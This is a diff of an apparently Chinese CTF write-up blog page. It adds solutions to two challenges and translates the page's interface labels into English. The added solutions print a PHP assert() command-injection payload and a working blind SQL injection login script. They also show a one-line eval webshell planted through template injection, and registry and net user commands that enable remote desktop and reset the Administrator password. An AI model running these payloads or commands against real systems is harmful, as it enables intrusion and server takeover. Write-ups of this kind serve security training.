@@ -36,7 +36,12 @@
 <meta property="og:image" content="http://ww3.sinaimg.cn/large/006iKNp3gy1fjsm91ak2kj30fs06jgnq.jpg">
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3gy1fjsm98tiabj30ug072q30.jpg">
 <meta property="og:image" content="http://ww2.sinaimg.cn/large/006iKNp3gy1fjsm9frsbqj30lx0e977w.jpg">
-<meta property="og:updated_time" content="2017-10-12T12:01:15.458Z">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006iKNp3gy1fkkabybwmlj30ej04jmx3.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/006iKNp3gy1fkkbpkw17oj30gq0ag0ts.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/006iKNp3gy1fkkc8whxcrj30dn06ymxl.jpg">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/006iKNp3gy1fkke2fr6sjj30v30jhjtq.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3gy1fkkecje92vj30ci06oq2v.jpg">
+<meta property="og:updated_time" content="2017-10-19T07:25:17.325Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ZJGSCTF_writeup">
 <meta name="twitter:description" content="——ZJGSCTF——-——持续更新中——-">
@@ -159,13 +164,13 @@
                 <div class="tips-box hide">
                     <div class="tips-arrow"></div>
                     <ul class="tips-inner">
-                        <li>菜单</li>
-                        <li>标签</li>
+                        <li>Menu</li>
+                        <li>Tags</li>
                         
-                        <li>友情链接</li>
+                        <li>Friends</li>
                         
                         
-                        <li>关于我</li>
+                        <li>About Me</li>
                         
                     </ul>
                 </div>
@@ -283,7 +288,7 @@
             </nav>
         </header>                
     </div>
-    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
 </nav>
       <div class="body-wrap"><article id="post-ZJGSCTF_writeup" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -453,6 +458,19 @@
 <li>与sql注入原理相同的php拼接写入代码</li>
 </ul>
 <p>payload(为了清楚，变量不写””):<br>‘’’php<br>$page = ‘.system(“ls ./templates”).’   ;<br>$file(合并后) = templates/‘.system(“ls ./templates”).’..php   ;<br>assert(“strpos(‘templates/.’ . system(“ls ./templates”) .  ‘..php’ , ‘..’ ) === false”)<br>‘’’<br>由于assert函数，会把””中的语句当做php代码执行，所以可以在其中用<strong>//</strong>注释””后面乱七八糟的语句，自己构筑代码<br>所以给出另一个payload<br>‘’’php<br>$page = ‘, ‘..’) === false and system(‘cat ./templates/flag.php’);    //   ;<br>$file(合并后) = templates/‘, ‘..’) === false and system(‘cat ./templates/flag.php’);    //.php   ;<br>assert(  “strpos(‘templates/‘ , ‘..’) === false  and  system(‘cat ./templates/flag.php’);    //.php’, ‘..’ ) === false”  );<br>‘’’<br>两种payload都可以在<code>system(&quot; &quot;)</code>中可以执行任意linux命令<br>flag.php返回需要查看源码才能看到…….嗯..绝望卡了两年</p>
+<h2 id="俄罗斯方块"><a href="#俄罗斯方块" class="headerlink" title="俄罗斯方块"></a>俄罗斯方块</h2><p><a href="http://web.jarvisoj.com:32798/" target="_blank" rel="external">戳这里=w=</a></p>
+<h3 id="js代码-jsFuck"><a href="#js代码-jsFuck" class="headerlink" title="js代码 jsFuck"></a>js代码 jsFuck</h3><p>一开始推断是到分数有服务器返回什么，抓包尝试修改无效。<br>源码找到<strong>tetris.js</strong><br><a href="http://tool.oschina.net/codeformat/js/" target="_blank" rel="external">js代码格式化</a>后阅读代码，找到关键代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.mayAdd = function(a) &#123;</div><div class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.scores.length &lt; <span class="keyword">this</span>.maxscores) <span class="keyword">return</span> <span class="number">1E6</span> &lt; a &amp;&amp; (a = <span class="keyword">new</span> p, a.set(<span class="string">"urlkey"</span>, <span class="string">"webqwer"</span> [<span class="number">1</span>] + <span class="string">"100.js"</span>, <span class="number">864E5</span>)),</div><div class="line">            !<span class="number">0</span>;</div><div class="line">            <span class="keyword">for</span> (var b = <span class="keyword">this</span>.scores.length - <span class="number">1</span>; <span class="number">0</span> &lt;= b; --b) <span class="keyword">if</span> (<span class="keyword">this</span>.scores[b].score &lt; a) <span class="keyword">return</span> <span class="number">1E6</span> &lt; a &amp;&amp; (a = <span class="keyword">new</span> p, a.set(<span class="string">"urlkey"</span>, <span class="string">"webqwer"</span> [<span class="number">1</span>] + <span class="string">"100.js"</span>, <span class="number">864E5</span>)),</div><div class="line">            !<span class="number">0</span>;</div><div class="line">            <span class="keyword">return</span> ! <span class="number">1</span></div><div class="line">        &#125;;</div></pre></td></tr></table></figure></p>
+<p>如果满足<strong>1E6 &lt; a</strong>执行<code>a.set(&quot;urlkey&quot;, &quot;webqwer&quot; [1] + &quot;100.js&quot;, 864E5)</code><br>此处传入三个参数<strong>“urlkey”</strong>，<strong>“e100.js”</strong>,<strong>864ES</strong><br>查看set函数<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.set = function(b, d, a, c, e, f) &#123;</div><div class="line">           <span class="keyword">this</span>.del(b);</div><div class="line">           c || (c = <span class="string">"/"</span>);</div><div class="line">           b = b + <span class="string">"="</span> + escape(d);</div><div class="line">           a &amp;&amp; (a = <span class="keyword">new</span> Date((<span class="keyword">new</span> Date).getTime() + <span class="number">1E3</span> * a), b += <span class="string">"; expires="</span> + a.toGMTString());</div><div class="line">           b = b + (c ? <span class="string">";\tpath="</span> + c: <span class="string">""</span>) + (e ? <span class="string">";\tdomain="</span> + e: <span class="string">""</span>);</div><div class="line">           b += f ? <span class="string">";\tsecure"</span>: <span class="string">""</span>;</div><div class="line">           document.cookie = b</div><div class="line">       &#125;;</div></pre></td></tr></table></figure></p>
+<p>发现函数应该是传入5个参数，有问题。<br>一个坑，其实三个参数只是提示，并不是可以执行的。<br>urlkey —&gt; url地址访问e100.js    864ES忽略<br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fkkabybwmlj30ej04jmx3.jpg" alt="jsfuck"><br>jsfuck编码，<a href="http://www.bugku.com/tools/jsfuck/#" target="_blank" rel="external">这里</a><br>得到flag</p>
+<h2 id="全球某工商CTF-安全系的博客"><a href="#全球某工商CTF-安全系的博客" class="headerlink" title="全球某工商CTF-安全系的博客"></a>全球某工商CTF-安全系的博客</h2><p><a href="http://10.21.13.225/zn" target="_blank" rel="external">戳这里=w=</a></p>
+<h3 id="后台-伪验证-sql注入-登录-模板注入攻击-菜刀"><a href="#后台-伪验证-sql注入-登录-模板注入攻击-菜刀" class="headerlink" title="后台 伪验证 sql注入 登录 模板注入攻击 菜刀"></a>后台 伪验证 sql注入 登录 模板注入攻击 菜刀</h3><p>很厉害的一个网页，随便点点没什么发现。<br>右键源码一个个看，没什么发现。<br>上工具<strong>SourceLeakHacker</strong>跑目录</p>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fkkbpkw17oj30gq0ag0ts.jpg" alt="跑目录"><br></div><br>先尝试访问<strong>200</strong>（正确返回），没有可用信息<br>再尝试访问<strong>303</strong>（跳转），找到<strong>/admin</strong>跳转至后台登录界面<strong>/admin-sign</strong><br>随意试着登录，有逐层递进四种返回状态：<br>+ <strong>参数不能为空！</strong>：判断参数是否为空<br>+ <strong>验证码不正确！</strong>：判断验证码<br>+ <strong>用户名不存在！</strong>：判断用户名是否存在<br>+ <strong>用户认证失败！</strong>：判断密码是否正确<br>先要解决验证码问题，抓包发现，发送账号密码验证码等信息后会再发一个请求包，来修改验证码图片<br><div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fkkc8whxcrj30dn06ymxl.jpg" alt="验证码包"><br></div>
+
+<p>丢弃这个包，验证码不再发生变化，等于绕过了验证<br>尝试<strong>sql注入</strong><br>在用户名处发现注入点<br><code>admin&#39; and &#39;1&#39;=&#39;1</code> 返回 用户认证失败<br><code>admin&#39; and &#39;1&#39;=&#39;2</code> 返回 用户名不存在<br>ps.关于解码/u 在返回包中有写着charset=UTF-8，在python中<code>urllib.unquote(b)</code>即可<br>boolean型盲注password，给出脚本代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"></div><div class="line">url=<span class="string">"http://10.21.13.225/admin-sign/login"</span></div><div class="line"></div><div class="line">payloads=<span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM,./;'[]\_@!#$%^&amp;*()-=+~`[];'./"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#判断列</span></div><div class="line">sql_column=<span class="string">"admin' and column is not null--+"</span>  <span class="comment">#替换column  得到 password</span></div><div class="line"><span class="comment">#列出password</span></div><div class="line">sql=<span class="string">"admin'  and  ascii(substring(password,%s,1))=%s-- "</span></div><div class="line"></div><div class="line">cookies = dict(ci_session=<span class="string">'b9de57e065184832d04df4c4aa18242f13e04d89'</span>)</div><div class="line"><span class="comment">#headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125;</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	data=&#123;<span class="string">'username'</span>:sql %(i,x),<span class="string">'password'</span>:<span class="string">'21232f297a57a5a743894a0e4a801fc3'</span>,<span class="string">'verify'</span>:<span class="string">'学商商浙浙商'</span>&#125;</div><div class="line">	response=requests.post(url,cookies=cookies,data=data)</div><div class="line">	<span class="comment">#print response.content</span></div><div class="line">	<span class="keyword">if</span>  response.text.find(<span class="string">'\u8ba4'</span>) != <span class="number">-1</span>:</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line"></div><div class="line">key=<span class="string">''</span></div><div class="line">print(<span class="string">'start'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">59</span>):</div><div class="line">	<span class="keyword">print</span> i</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">30</span>,<span class="number">151</span>):</div><div class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</div><div class="line">			key += chr(x)</div><div class="line">			print(key)</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure></p>
+<p>得到admin的密码MD5为1c63129ae9db9c60c3e8aa94d3e00495<br>直接登录到后台。<br>发现修改语言里面的东西没有权限。<br>发现有管理员账号<strong>orleven</strong>，<strong>平行越权</strong>修改管理员密码。<br> 平行越权：设置-修改密码，抓包修改admin为orleven。<br>登录进入中文的编辑语言界面。（如果选英文的需要设置为启动，不然之后菜刀连接不上界面）<br>尝试<strong>模板注入漏洞</strong>，后尾加入<code>&quot;;phpinfo();&quot;</code>闭合前后引号<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fkke2fr6sjj30v30jhjtq.jpg" alt=""><br>页面变化，说明修改了代码可以执行<br>再加入菜刀php木马<code>&quot;;@eval($_POST[&#39;Cknife&#39;]);&quot;</code><br>连上菜刀</p>
+<p><div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fkkecje92vj30ci06oq2v.jpg" alt=""><br></div><br>可以直接在桌面上找到flag<br>或者继续：</p>
+<p>切换到菜刀终端模式，开启远程连接3389端口<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">删除注册表</div><div class="line">reg delete <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /f</div><div class="line">添加注册表</div><div class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div></pre></td></tr></table></figure></p>
+<p>修改密码<code>net user Administrator (复杂的密码)</code><br>打开远程桌面连接，账号administrator 密码<br>桌面上得到flag</p>
 
       
     </div>
@@ -461,17 +479,17 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/09/18/ZJGSCTF_writeup/">ZJGSCTF_writeup</a></p>
-        <p><span>文章作者:</span><a href="/" title="回到主页">LaLa</a></p>
-        <p><span>发布时间:</span>2017-09-18, 08:17:13</p>
-        <p><span>最后更新:</span>2017-10-12, 20:01:15</p>
+        <p><span>Title:</span><a href="/2017/09/18/ZJGSCTF_writeup/">ZJGSCTF_writeup</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage">LaLa</a></p>
+        <p><span>Created:</span>2017-09-18, 08:17:13</p>
+        <p><span>Updated:</span>2017-10-19, 15:25:17</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/09/18/ZJGSCTF_writeup/" title="ZJGSCTF_writeup">http://lalajun.com/2017/09/18/ZJGSCTF_writeup/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://lalajun.com/2017/09/18/ZJGSCTF_writeup/　　作者: LaLa" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>Full URL:</span><a class="post-url" href="/2017/09/18/ZJGSCTF_writeup/" title="ZJGSCTF_writeup">http://lalajun.com/2017/09/18/ZJGSCTF_writeup/</a>
+            <span class="copy-path" data-clipboard-text="From http://lalajun.com/2017/09/18/ZJGSCTF_writeup/　　By LaLa" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
-            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
         </p>
     </div>
 
@@ -498,9 +516,9 @@
 </article>
 
     <div id="toc" class="toc-article">
-        <strong class="toc-title">文章目录</strong>
+        <strong class="toc-title">Contents</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#9-7-综合题"><span class="toc-text">[9-7]综合题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：编码及Linux"><span class="toc-text">涉及范围：编码及Linux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-31-水能载舟亦可赛艇"><span class="toc-text">[8-31]水能载舟亦可赛艇</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围-php源码，sql注入"><span class="toc-text">涉及范围:php源码，sql注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-18-有点意思吧"><span class="toc-text">[9.18]有点意思吧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：php源码，hash长度扩展攻击"><span class="toc-text">涉及范围：php源码，hash长度扩展攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有点意思吧2"><span class="toc-text">有点意思吧2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：目录遍历-file命令-swp，php源码-hash长度攻击-脚本"><span class="toc-text">涉及范围：目录遍历,file命令,.swp，php源码,hash长度攻击,脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-1-看起来有点难啊"><span class="toc-text">[9.1]看起来有点难啊</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：sql盲注"><span class="toc-text">涉及范围：sql盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#皇家邮电平台"><span class="toc-text">皇家邮电平台</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：源码泄露，本地文件包含，sql注入，后门利用"><span class="toc-text">涉及范围：源码泄露，本地文件包含，sql注入，后门利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyphp"><span class="toc-text">babyphp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#git信息泄露-hackgit-php字符串拼接注入"><span class="toc-text">.git信息泄露 hackgit php字符串拼接注入</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#9-7-综合题"><span class="toc-text">[9-7]综合题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：编码及Linux"><span class="toc-text">涉及范围：编码及Linux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-31-水能载舟亦可赛艇"><span class="toc-text">[8-31]水能载舟亦可赛艇</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围-php源码，sql注入"><span class="toc-text">涉及范围:php源码，sql注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-18-有点意思吧"><span class="toc-text">[9.18]有点意思吧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：php源码，hash长度扩展攻击"><span class="toc-text">涉及范围：php源码，hash长度扩展攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有点意思吧2"><span class="toc-text">有点意思吧2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：目录遍历-file命令-swp，php源码-hash长度攻击-脚本"><span class="toc-text">涉及范围：目录遍历,file命令,.swp，php源码,hash长度攻击,脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-1-看起来有点难啊"><span class="toc-text">[9.1]看起来有点难啊</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：sql盲注"><span class="toc-text">涉及范围：sql盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#皇家邮电平台"><span class="toc-text">皇家邮电平台</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：源码泄露，本地文件包含，sql注入，后门利用"><span class="toc-text">涉及范围：源码泄露，本地文件包含，sql注入，后门利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyphp"><span class="toc-text">babyphp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#git信息泄露-hackgit-php字符串拼接注入"><span class="toc-text">.git信息泄露 hackgit php字符串拼接注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#俄罗斯方块"><span class="toc-text">俄罗斯方块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#js代码-jsFuck"><span class="toc-text">js代码 jsFuck</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#全球某工商CTF-安全系的博客"><span class="toc-text">全球某工商CTF-安全系的博客</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#后台-伪验证-sql注入-登录-模板注入攻击-菜刀"><span class="toc-text">后台 伪验证 sql注入 登录 模板注入攻击 菜刀</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -514,10 +532,10 @@
         }
     </style>
 
-    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
 
     <script>
-        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+        yiliaConfig.toc = ["Hide", "Show", !!"false"];
     </script>
 
 
@@ -531,15 +549,15 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/09/24/WEB-CTF中的sql盲注/" title="上一篇: WEB-CTF中的sql盲注">
+            <a href="/2017/09/24/WEB-CTF中的sql盲注/" title="Pre: WEB-CTF中的sql盲注">
                 <i class="fa fa-angle-left"></i>
             </a>
         
 
-        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/08/29/WEB-CTF中的SQL注入/" title="下一篇: WEB-CTF中的SQL注入">
+            <a href="/2017/08/29/WEB-CTF中的SQL注入/" title="Next: WEB-CTF中的SQL注入">
                 <i class="fa fa-angle-right"></i>
             </a>
         
@@ -562,14 +580,14 @@
                 2017 LaLa
             </div>
             <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
             </div>
         </div>
         
             <div class="visit">
                 
                     <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                         </span>
                     </span>
                 
@@ -578,7 +596,7 @@
                 
                 
                     <span id="busuanzi_container_page_pv" style='display:none'>
-                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                         </span>
                     </span>
                 
@@ -611,9 +629,9 @@
 
 
 <div class="scroll" id="scroll">
-    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
-    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
-    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
 </div>
 <script>
     // Open in New Window
